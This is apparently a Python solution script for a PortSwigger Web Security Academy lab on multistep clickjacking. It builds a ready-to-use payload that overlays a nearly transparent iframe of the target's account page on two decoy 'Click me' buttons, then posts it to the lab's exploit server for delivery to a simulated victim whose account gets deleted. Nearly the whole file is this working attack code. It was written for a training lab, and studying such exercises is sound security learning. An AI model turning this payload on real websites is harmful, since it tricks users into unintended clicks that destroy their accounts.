####################################################################
#
# Lab: Multistep clickjacking
#
# Hack Steps:
#      1. Adjust the frame dimensions and the decoy buttons offset
#      2. Deliver the exploit to the victim
#
####################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0afe00c80339e60b841a972e006a0053.web-security-academy.net"

# Change this to your exploit server URL
EXPLOIT_SERVER_URL = "https://exploit-0aee00e7034fe6f7843b961e016800f4.exploit-server.net"

def main():
    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    frame_width = 700
    frame_height = 700
    first_decoy_button_top = 500
    first_decoy_button_left = 100
    second_decoy_button_top = 300
    second_decoy_button_left = 200
    payload = f"""<head>
                        <style>
                            #target_website {{
                                position: relative;
                                width: {frame_width}px;
                                height: {frame_height}px;
                                opacity: 0.0001;
                                z-index: 2;
                                }}
                            #decoy_website {{
                                position: absolute;
                                top: {first_decoy_button_top}px;
                                left: {first_decoy_button_left}px;
                                z-index: 1;
                                }}
                            #decoy_website_2 {{
                                position: absolute;
                                top: {second_decoy_button_top}px;
                                left: {second_decoy_button_left}px;
                                z-index: 1;
                                }}
                        </style>
                    </head>
                    ...
                    <body>
                        <dev id="decoy_website"> Click me first </dev>
                        <dev id="decoy_website_2"> Click me next </dev>
                        <iframe id="target_website" src="{LAB_URL}/my-account"></iframe>
                    </body>"""
    data = { "responseBody": payload, "responseHead": response_head, "formAction": "DELIVER_TO_VICTIM", "urlIsHttps": "on", "responseFile": "/exploit" }

    print("❯❯ Delivering the exploit to the victim.. ", end="", flush=True)
    
    try:
        requests.post(EXPLOIT_SERVER_URL, data)

    except:
        print(Fore.RED + "⦗!⦘ Failed to deliver the exploit to the victim through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The victim's account will be deleted after clicking on the decoy button") 
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()


